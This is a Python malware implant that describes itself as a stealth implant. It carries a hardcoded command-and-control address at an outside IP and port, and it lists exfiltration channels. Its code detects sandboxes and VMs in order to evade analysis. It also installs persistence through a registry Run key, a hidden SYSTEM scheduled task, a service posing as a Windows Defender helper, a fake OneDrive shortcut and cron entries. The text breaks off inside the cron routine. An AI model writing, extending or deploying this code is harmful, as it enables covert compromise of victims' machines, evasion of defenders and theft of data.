#!/usr/bin/env python3
"""
STEALTH IMPLANT - Enhanced persistence and exfiltration options
Features:
1. Multiple persistence methods (Windows/Linux/macOS)
2. Multiple exfil channels (ICMP, WebSocket, QUIC, HTTPS+CDN)
3. Traffic blending with legitimate protocols
4. Advanced sandbox/VM detection
5. Jitter and timing obfuscation
"""

import os
import sys
import json
import time
import base64
import hashlib
import random
import socket
import struct
import threading
import subprocess
import platform
from datetime import datetime
from typing import Dict, List, Optional, Any
import urllib.request
import urllib.parse
import ssl
from cryptography.fernet import Fernet

# -------------------------------------------------------------------
# Configuration
# -------------------------------------------------------------------
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
IS_MACOS = platform.system().lower() == 'darwin'

# C2 Configuration (set by stager)
C2_URL = os.environ.get('ROGUE_C2_URL', 'http://187.124.153.242:4444')
SESSION_KEY = os.environ.get('ROGUE_SESSION_KEY', '')
IMPLANT_ID = os.environ.get('ROGUE_IMPLANT_ID', '')

# Exfiltration options (priority order)
EXFIL_OPTIONS = ['https', 'websocket', 'icmp', 'dns', 'quic']
ACTIVE_EXFIL = 'https'  # Default, will auto-switch

# -------------------------------------------------------------------
# 1. ADVANCED SANDBOX DETECTION
# -------------------------------------------------------------------
class SandboxDetector:
    """Detect analysis environments with multiple techniques."""
    
    @staticmethod
    def detect() -> bool:
        """Return True if sandbox/VM detected."""
        detectors = [
            SandboxDetector.check_uptime,
            SandboxDetector.check_memory,
            SandboxDetector.check_cpu_cores,
            SandboxDetector.check_processes,
            SandboxDetector.check_mac_vendor,
            SandboxDetector.check_disk_size,
            SandboxDetector.check_user_interaction,
        ]
        
        detection_score = 0
        for detector in detectors:
            if detector():
                detection_score += 1
        
        # Threshold: 3 or more indicators = sandbox
        return detection_score >= 3
    
    @staticmethod
    def check_uptime() -> bool:
        """Check if system has been up for less than 5 minutes."""
        try:
            if IS_WINDOWS:
                import ctypes
                uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
                return uptime < 300
            elif IS_LINUX:
                with open('/proc/uptime', 'r') as f:
                    uptime = float(f.read().split()[0])
                    return uptime < 300
            elif IS_MACOS:
                import subprocess
                out = subprocess.check_output(['sysctl', '-n', 'kern.boottime'], text=True)
                boot = int(out.split()[3].rstrip(','))
                uptime = int(time.time()) - boot
                return uptime < 300
        except:
            pass
        return False
    
    @staticmethod
    def check_memory() -> bool:
        """Check if system has less than 2GB RAM (common in VMs)."""
        try:
            if IS_WINDOWS:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                c_ulong = ctypes.c_ulong
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ('dwLength', c_ulong),
                        ('dwMemoryLoad', c_ulong),
                        ('ullTotalPhys', ctypes.c_ulonglong),
                        ('ullAvailPhys', ctypes.c_ulonglong),
                        ('ullTotalPageFile', ctypes.c_ulonglong),
                        ('ullAvailPageFile', ctypes.c_ulonglong),
                        ('ullTotalVirtual', ctypes.c_ulonglong),
                        ('ullAvailVirtual', ctypes.c_ulonglong),
                        ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
                    ]
                memoryStatus = MEMORYSTATUSEX()
                memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
                total_gb = memoryStatus.ullTotalPhys / (1024**3)
                return total_gb < 2.0
            elif IS_LINUX:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemTotal:'):
                            kb = int(line.split()[1])
                            gb = kb / (1024**2)
                            return gb < 2.0
            elif IS_MACOS:
                import subprocess
                out = subprocess.check_output(['sysctl', '-n', 'hw.memsize'], text=True)
                bytes = int(out.strip())
                gb = bytes / (1024**3)
                return gb < 2.0
        except:
            pass
        return False
    
    @staticmethod
    def check_cpu_cores() -> bool:
        """Check if system has only 1-2 CPU cores (common in VMs)."""
        try:
            cores = os.cpu_count()
            return cores is not None and cores <= 2
        except:
            pass
        return False
    
    @staticmethod
    def check_processes() -> bool:
        """Check for analysis tool processes."""
        analysis_tools = [
            'wireshark', 'procmon', 'processhacker', 'tcpview',
            'regshot', 'apatedns', 'sandboxie', 'vmware',
            'virtualbox', 'vbox', 'qemu', 'xen', 'hyperv'
        ]
        
        try:
            if IS_WINDOWS:
                import ctypes
                from ctypes import wintypes
                
                kernel32 = ctypes.windll.kernel32
                CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
                Process32First = kernel32.Process32First
                Process32Next = kernel32.Process32Next
                CloseHandle = kernel32.CloseHandle
                
                TH32CS_SNAPPROCESS = 0x00000002
                
                class PROCESSENTRY32(ctypes.Structure):
                    _fields_ = [
                        ('dwSize', wintypes.DWORD),
                        ('cntUsage', wintypes.DWORD),
                        ('th32ProcessID', wintypes.DWORD),
                        ('th32DefaultHeapID', wintypes.ULONG),
                        ('th32ModuleID', wintypes.DWORD),
                        ('cntThreads', wintypes.DWORD),
                        ('th32ParentProcessID', wintypes.DWORD),
                        ('pcPriClassBase', wintypes.LONG),
                        ('dwFlags', wintypes.DWORD),
                        ('szExeFile', wintypes.CHAR * 260)
                    ]
                
                hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                if hSnapshot:
                    pe32 = PROCESSENTRY32()
                    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
                    
                    if Process32First(hSnapshot, ctypes.byref(pe32)):
                        while True:
                            exe_name = pe32.szExeFile.decode('utf-8', errors='ignore').lower()
                            for tool in analysis_tools:
                                if tool in exe_name:
                                    CloseHandle(hSnapshot)
                                    return True
                            
                            if not Process32Next(hSnapshot, ctypes.byref(pe32)):
                                break
                    
                    CloseHandle(hSnapshot)
            
            elif IS_LINUX or IS_MACOS:
                import subprocess
                try:
                    if IS_LINUX:
                        ps_output = subprocess.check_output(['ps', 'aux'], text=True)
                    else:  # macOS
                        ps_output = subprocess.check_output(['ps', 'aux'], text=True)
                    
                    ps_lower = ps_output.lower()
                    for tool in analysis_tools:
                        if tool in ps_lower:
                            return True
                except:
                    pass
        except:
            pass
        
        return False
    
    @staticmethod
    def check_mac_vendor() -> bool:
        """Check MAC address vendor for VM vendors."""
        vm_vendors = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27']
        
        try:
            if IS_WINDOWS:
                import subprocess
                output = subprocess.check_output(['getmac', '/v'], text=True, shell=True)
                for vendor in vm_vendors:
                    if vendor in output:
                        return True
            elif IS_LINUX:
                with open('/sys/class/net/eth0/address', 'r') as f:
                    mac = f.read().strip()
                    for vendor in vm_vendors:
                        if mac.startswith(vendor):
                            return True
        except:
            pass
        
        return False
    
    @staticmethod
    def check_disk_size() -> bool:
        """Check if disk is unusually small (VM)."""
        try:
            if IS_WINDOWS:
                import ctypes
                free = ctypes.c_ulonglong(0)
                total = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    'C:\\', None, ctypes.byref(total), ctypes.byref(free)
                )
                total_gb = total.value / (1024**3)
                return total_gb < 20.0  # Less than 20GB
            else:
                import subprocess
                if IS_LINUX:
                    output = subprocess.check_output(['df', '-h', '/'], text=True)
                else:  # macOS
                    output = subprocess.check_output(['df', '-h', '/'], text=True)
                
                lines = output.strip().split('\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    if len(parts) >= 2:
                        size_str = parts[1]
                        if 'G' in size_str:
                            size_gb = float(size_str.replace('G', ''))
                            return size_gb < 20.0
        except:
            pass
        
        return False
    
    @staticmethod
    def check_user_interaction() -> bool:
        """Check if user is interacting (mouse movement, keyboard)."""
        try:
            if IS_WINDOWS:
                import ctypes
                from ctypes import wintypes
                
                class LASTINPUTINFO(ctypes.Structure):
                    _fields_ = [
                        ('cbSize', wintypes.UINT),
                        ('dwTime', wintypes.DWORD)
                    ]
                
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
                ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
                
                tick_count = ctypes.windll.kernel32.GetTickCount()
                idle_time = (tick_count - lastInputInfo.dwTime) / 1000.0
                
                # If idle for more than 10 minutes, might be automated
                return idle_time > 600
        except:
            pass
        
        return False

# -------------------------------------------------------------------
# 2. STEALTH PERSISTENCE
# -------------------------------------------------------------------
class StealthPersistence:
    """Multiple persistence methods with fallbacks."""
    
    def __init__(self, implant_path: str):
        self.implant_path = implant_path
        self.installed = False
    
    def install(self) -> bool:
        """Install persistence using best available method."""
        methods = []
        
        if IS_WINDOWS:
            methods = [
                self._windows_registry_run,
                self._windows_scheduled_task,
                self._windows_service,
                self._windows_startup_folder
            ]
        elif IS_LINUX:
            methods = [
                self._linux_cron,
                self._linux_systemd,
                self._linux_rc_local,
                self._linux_profile
            ]
        elif IS_MACOS:
            methods = [
                self._macos_launch_agent,
                self._macos_cron,
                self._macos_login_item
            ]
        
        # Try each method until one succeeds
        for method in methods:
            try:
                if method():
                    print(f"[+] Persistence installed via {method.__name__}")
                    self.installed = True
                    return True
            except Exception as e:
                print(f"[-] Persistence method {method.__name__} failed: {e}")
        
        return False
    
    def _windows_registry_run(self) -> bool:
        """Install via Windows Registry Run key."""
        import winreg
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "WindowsUpdateService"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, self.implant_path)
            winreg.CloseKey(key)
            return True
        except:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, self.implant_path)
                winreg.CloseKey(key)
                return True
            except:
                return False
    
    def _windows_scheduled_task(self) -> bool:
        """Install via Windows Scheduled Task."""
        try:
            task_name = "MicrosoftEdgeUpdateTask"
            xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2026-03-23T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.implant_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(xml)
            
            subprocess.run([
                'schtasks', '/create', '/tn', task_name,
                '/xml', xml_path, '/f'
            ], capture_output=True, shell=True)
            
            os.remove(xml_path)
            return True
        except:
            return False
    
    def _windows_service(self) -> bool:
        """Install as Windows Service (requires admin)."""
        try:
            service_name = "WinDefendHelper"
            display_name = "Windows Defender Helper Service"
            
            # Use sc.exe to create service
            subprocess.run([
                'sc', 'create', service_name,
                'binPath=', f'"{self.implant_path}"',
                'DisplayName=', display_name,
                'start=', 'auto'
            ], capture_output=True, shell=True)
            
            subprocess.run([
                'sc', 'description', service_name,
                'Helps Windows Defender with threat detection'
            ], capture_output=True, shell=True)
            
            return True
        except:
            return False
    
    def _windows_startup_folder(self) -> bool:
        """Install in Startup folder."""
        try:
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            shortcut_path = os.path.join(startup_path, 'OneDrive.lnk')
            
            # Create shortcut
            import pythoncom
            from win32com.client import Dispatch
            
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = self.implant_path
            shortcut.WorkingDirectory = os.path.dirname(self.implant_path)
            shortcut.IconLocation = "%SystemRoot%\\system32\\shell32.dll,1"
            shortcut.save()
            
            return True
        except:
            return False
    
    def _linux_cron(self) -> bool:
        """Install via crontab."""
        try:
            # Add to user's crontab
            cron_line = f"@reboot {self.implant_path} > /dev/null 2>&1 &\n"
            cron_line += f"*/30 * * * * {self.implant_path}